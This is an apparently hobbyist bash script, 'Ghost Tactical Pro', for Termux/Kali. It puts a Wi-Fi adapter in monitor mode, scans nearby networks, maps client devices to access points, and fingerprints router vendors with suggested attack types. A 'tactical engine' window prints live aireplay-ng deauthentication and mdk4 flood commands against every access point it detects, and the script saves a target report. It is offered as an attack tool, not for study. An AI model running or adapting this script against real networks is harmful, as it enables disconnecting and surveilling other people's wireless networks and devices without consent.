#!/bin/bash

# --- CONFIGURATION ---
IFACE="wlan0mon"
TEMP_FILE="ghost_v19_intel"

# --- COLORS ---
RED="\e[1;31m"; GREEN="\e[1;32m"; YELLOW="\e[1;33m"
BLUE="\e[1;34m"; CYAN="\e[1;36m"; WHITE="\e[1;37m"; RESET="\e[0m"; BOLD="\e[1m"; ORANGE='\033[1;33m'

# --- BANNER DATA ---
MODEL=$(getprop ro.product.model 2>/dev/null || echo "Ghost-Machine")
IP=$(ifconfig wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}')
[ -z "$IP" ] && IP="Disconnected"
BATT=$(termux-battery-status 2>/dev/null | grep "percentage" | awk -F: '{print $2}' | tr -d ' ,%')
[ -z "$BATT" ] && BATT="100"
BATT="${BATT}%"

# --- REKAPAN AKHIR ---
function generate_report() {
    local REPORT="GHOST_FINAL_AUDIT.txt"
    {
        echo "========================================================="
        echo "           GHOST TACTICAL PROFESSIONAL REPORT"
        echo "           Operator  : Sneijderlino"
        echo "           Timestamp : $(date)"
        echo "========================================================="
        echo -e "\n[+] TARGET INFRASTRUCTURE:"
        if [ -f ${TEMP_FILE}-01.csv ]; then
            awk -F, '/BSSID/{f=1;next} /Station/{f=0} f && NF>10 {print "SSID: " $14 " | BSSID: " $1 " | CH: " $4 " | ENC: " $6}' ${TEMP_FILE}-01.csv | column -t
        fi
        echo -e "\n[+] ACTIVE CLIENT TOPOLOGY:"
        if [ -f ${TEMP_FILE}-01.csv ]; then
            grep -a "Station" -A 100 ${TEMP_FILE}-01.csv | tail -n +2 | awk -F, '{print "Client: " $1 " -> Connected to AP: " $6}' | column -t
        fi
        echo -e "\n========================================================="
    } > "$REPORT"
    
    clear
    echo -e "${RED}${BOLD}           MISSION COMPLETE: OPERASI GHOST${RESET}"
    echo -e "${GREEN}════════════════════════════════════════════════════════════════${RESET}"
    cat "$REPORT"
    echo -e "${GREEN}════════════════════════════════════════════════════════════════${RESET}"
    echo -e "${CYAN}[V] Log Intelijen Tersimpan: ${WHITE}$REPORT${RESET}"
}

trap ctrl_c INT
function ctrl_c() {
    echo -e "\n\n${RED}[!] EMERGENCY SHUTDOWN...${RESET}"
    killall xterm airodump-ng 2>/dev/null
    generate_report
    rm -f ${TEMP_FILE}* .map.tmp
    echo -e "${BLUE}[*] Ghosting out. Stay Under the Radar.${RESET}"
    exit 0
}

# --- TAMPILAN BANNER SNEIJDERLINO ---
clear
echo -e "${RED}${BOLD}"
echo -e "           uuuuuuu             "
echo -e "       uu\$\$\$\$\$\$\$\$\$\$\$uu         "
echo -e "    uu\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u      "
echo -e "   u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u       ${BLUE}WELCOME GHOST${RED}"
echo -e "   u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$      ${GREEN}───────────────────────${RED}"
echo -e "  u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u     ${BLUE}Model  : $MODEL${RED}"
echo -e "  u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u     ${BLUE}Battery: $BATT${RED}"
echo -e "  u\$\$\$\$\$\$\"   \"\$\$\$\"   \"\$\$\$\$\$u    ${BLUE}IP Net : $IP${RED}"
echo -e "  \"\$\$\$\$\"      u\$u       \"\$\$\$    ${YELLOW}[Tools BY:Sneijderlino]${RED}"
echo -e "   \$\$\$u       u\$u       u\$\$\$    ${GREEN}───────────────────────${RED}"
echo -e "   \$\$\$u      u\$\$\$u      u\$\$\$    "
echo -e "    \"\$\$\$\$uu\$\$\$   \$\$\$uu\$\$\$\$\"    "
echo -e "     \"\$\$\$\$\$\$\$\"   \"\$\$\$\$\$\$\$\"    "
echo -e "       u\$\$\$\$\$\$\$u\$\$\$\$\$\$\$u       "
echo -e "        u\$\"\$\"\$\"\$\"\$\"\$\"\$u        "
echo -e "         \$\$u\$u\$u\$u\$u\$\$         "
echo -e "          \$\$\$\$\$\$\$\$\$\$\$          "
echo -e "           \"\$\$\$\$\$\$\$\"           "
echo -e "${BLUE}[ ${ORANGE}KALI LINUX ${WHITE}| ${BLUE}TERMUX ${WHITE}| ${CYAN}HACKING ${BLUE}]${RESET}"
echo -e "${GREEN}════════════════════════════════════════════════════════${RESET}"

rm -f ${TEMP_FILE}*
stdbuf -oL airodump-ng --output-format csv --write-interval 1 -w $TEMP_FILE $IFACE > /dev/null 2>&1 &
sleep 2

# --- WINDOW SPECS ---
W="71"
H="21"
FONT="-fa 'Monospace' -fs 10"
HEADER="echo -e '   ${RED}GHOST TACTICAL PRO${RESET} | ${BLUE}$MODEL${RESET} | ${YELLOW}$BATT${RESET}\n   ${GREEN}───────────────────────────────────────────────────────${RESET}'"

# 1. SCANNER: SSID ANALYTICS
xterm -geometry ${W}x${H}+0+0 $FONT -bg black -fg green -T "INFRASTRUCTURE SCAN" -e \
bash -c "while true; do clear; $HEADER; echo -e '   ${WHITE}MAC ADDRESS       CH  PWR  SSID${RESET}';
if [ -f ${TEMP_FILE}-01.csv ]; then
    awk -F, '/BSSID/{f=1;next} /Station/{f=0} f && NF>10 {
        ssid=\$14; if(length(ssid)<=1 || ssid~/\\\\x00/) ssid=\"${RED}[HIDDEN_NET]${RESET}\";
        printf \"   %-17s %-3s %-4s %s\n\", \$1, \$4, \$9, ssid
    }' ${TEMP_FILE}-01.csv | grep -v 'BSSID' | head -n 15
fi; sleep 2; done" &

# 2. CLIENT MAP: TOPOLOGY RESOLVER (FIXED LOGIC)
xterm -geometry ${W}x${H}+660+0 $FONT -bg black -fg cyan -T "TOPOLOGY MAP" -e \
bash -c "while true; do clear; $HEADER; echo -e '   ${WHITE}CLIENT MAC         STATUS     TARGET SSID${RESET}';
if [ -f ${TEMP_FILE}-01.csv ]; then
    grep ',' ${TEMP_FILE}-01.csv | awk -F, '/BSSID/{f=1;next} /Station/{f=0} f {print \$1 \"|\" \$14}' > .map.tmp
    awk -F, '/Station/{f=1;next} f && NF>5 {print \$6 \" \" \$1}' ${TEMP_FILE}-01.csv | while read ap cl; do
        if [ ! -z \"\$ap\" ]; then
            name=\$(grep -w \"\$ap\" .map.tmp | head -n 1 | cut -d'|' -f2 | xargs 2>/dev/null);
            if [ -z \"\$name\" ] || [ \"\${#name}\" -le 1 ]; then 
                st=\"${YELLOW}PROBING${RESET}\"; name=\"---\"; 
            else 
                st=\"${GREEN}ACTIVE${RESET}\"; 
            fi
            printf \"   %-17s [%-7b] %s\n\" \"\$cl\" \"\$st\" \"\$name\"
        fi
    done | head -n 15
fi; sleep 2; done" &

# 3. VENDOR AUDIT: ADVANCED FINGERPRINTING
xterm -geometry ${W}x${H}+0+440 $FONT -bg black -fg yellow -T "VENDOR INTEL" -e \
bash -c "while true; do clear; $HEADER; echo -e '   ${WHITE}SSID           | VENDOR       | VULN ASSESSMENT${RESET}';
if [ -f ${TEMP_FILE}-01.csv ]; then
    awk -F, '/BSSID/{f=1;next} /Station/{f=0} f && NF>10 {
        m=toupper(\$1); v=\"Generic\"; a=\"Auth-Flood\";
        if(m~/^00:0C:43|^E4:8D:8C|^08:40:F3/) {v=\"MediaTek\"; a=\"WPS-Pixie/MDK\"}
        if(m~/^D8:47:32|^00:1D:0F|^TP-LINK/) {v=\"TP-Link\"; a=\"PIN-Brute/DoS\"}
        if(m~/^C0:25:E9|^A4:2B:B0/) {v=\"Huawei/ZTE\"; a=\"Null-Inject/DoS\"}
        if(m~/^80:EA:96|^UBIQUITI/) {v=\"Ubiquiti\"; a=\"mDNS-Leak/Deauth\"}
        printf \"   %-14.14s | %-12s | %s\n\", \$14, v, a
    }' ${TEMP_FILE}-01.csv | grep -v 'ESSID' | head -n 12
fi; sleep 3; done" &

# 4. EXPLOIT ENGINE: TACTICAL VECTORS (BRUTAL RE-ENABLED)
xterm -geometry ${W}x${H}+660+440 $FONT -bg black -fg red -T "TACTICAL ENGINE" -e \
bash -c "while true; do clear; $HEADER; echo -e '   ${RED}${BOLD}--- RECOMMENDED TACTICAL ACTIONS ---${RESET}';
if [ -f ${TEMP_FILE}-01.csv ]; then
    sed -n '/BSSID/,/Station/p' ${TEMP_FILE}-01.csv | grep \",\" | grep -v \"BSSID\" | while read line; do
        B=\$(echo \$line | awk -F, '{print \$1}'); S=\$(echo \$line | awk -F, '{print \$14}' | xargs);
        C=\$(echo \$line | awk -F, '{print \$4}' | xargs);
        if [ ! -z \"\$B\" ]; then
            echo -e \"   ${ORANGE}Target: \${S:-[HIDDEN]} (CH: \$C)${RESET}\"
            echo -e \"   ${RED}>>${RESET} aireplay-ng -0 5 -a \$B $IFACE\"
            echo -e \"   ${RED}>>${RESET} mdk4 $IFACE d -b .map.tmp -c \$C\"
            echo -e \"   -----------------------------------------------\"
        fi
    done | head -n 6
fi; sleep 4; done" &

echo -e "${GREEN}[+] GHOST COMMAND CENTER v19 ELITE ONLINE.${RESET}"
while true; do sleep 1; done